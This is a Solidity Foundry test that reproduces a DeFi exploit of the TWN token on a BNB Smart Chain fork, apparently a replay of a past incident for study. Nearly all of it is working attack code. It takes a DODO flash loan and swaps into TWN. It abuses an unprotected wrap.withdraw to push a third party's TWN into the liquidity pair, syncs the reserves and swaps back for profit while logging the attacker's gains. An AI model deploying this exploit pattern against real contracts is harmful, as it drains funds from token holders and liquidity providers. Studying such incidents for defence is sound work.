// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../utils/interface.sol";  //导入上一级的接口文件


interface IWRAP {
    function withdraw(address from, address to, uint256 amount) external;
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assertTo, bytes calldata data) external;

    function _BASE_TOKEN_() external view returns (address);
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 TWN = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);
    IWRAP wrap = IWRAP(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);
    address constant dodo = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // fork 区块号
        cheats.createSelectFork("bsc", 21_572_418);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);
        USDT.approve(address(Router), ~uint256(0));
        TWN.approve(address(Router), ~uint256(0));
        // 闪电贷过程，借款200_000 ether USDT并操纵
        IDODO(dodo).flashLoan(0, 200_000 * 1e18, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    
    //function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assertTo, bytes calldata data) external {
    //    IDODO(dodo).DPPFlashLoanCall(address(this), baseAmount, quoteAmount, data);
    //}

    // DPPFlashLoanCall
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        SwapUSDTtoTWN();
        console.log("transfer 1 ether from receiver to pair");
        USDT.transfer(address(pair), 1);
        // 向池子注入流动性后获得的LP token
        emit log_named_decimal_uint("pair TWN banlance:",  TWN.balanceOf(address(pair)), 18);
        uint256 amount = TWN.balanceOf(address(pair)) * 100 / 9;
        wrap.withdraw(address(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), address(pair), amount);
        pair.sync();
        SwapTWNtoUSDT();
        // 闪电贷还款
        USDT.transfer(address(dodo), 200_000 * 1e18);
    }

    // USDT -> TWN
    function SwapUSDTtoTWN() public {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(TWN);
        console.log("USDT -> TWN");
        emit log_named_decimal_uint("[SwapUSDTtoTWN] Attacker USDT balance before", USDT.balanceOf(address(this)), 18);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1000 * 1e18, 0, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint("[SwapUSDTtoTWN] Attacker USDT balance after", USDT.balanceOf(address(this)), 18);
        console.log("[SwapUSDTtoTWN] Attacker USDT use: 1000 ether");
        emit log_named_decimal_uint("[SwapUSDTtoTWN] Attacker TWN balance get", TWN.balanceOf(address(this)), 18);
    }

    function SwapTWNtoUSDT() public {
        address[] memory path = new address[](2);
        path[0] = address(TWN);
        path[1] = address(USDT);
        console.log("TWN -> USDT");
        uint a = USDT.balanceOf(address(this));
        emit log_named_decimal_uint("[SwapTWNtoUSDT] Attacker USDT balance before", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[SwapTWNtoUSDT] Attacker TWN balance before", TWN.balanceOf(address(this)), 18);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TWN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint("[SwapTWNtoUSDT] Attacker TWN balance after", TWN.balanceOf(address(this)), 18);
        //emit log_named_decimal_uint("[SwapTWNtoUSDT] Attacker TWN use", TWN.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[SwapTWNtoUSDT] Attacker USDT balance after", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[SwapTWNtoUSDT] Attacker USDT get", USDT.balanceOf(address(this))-a, 18);
    }
}
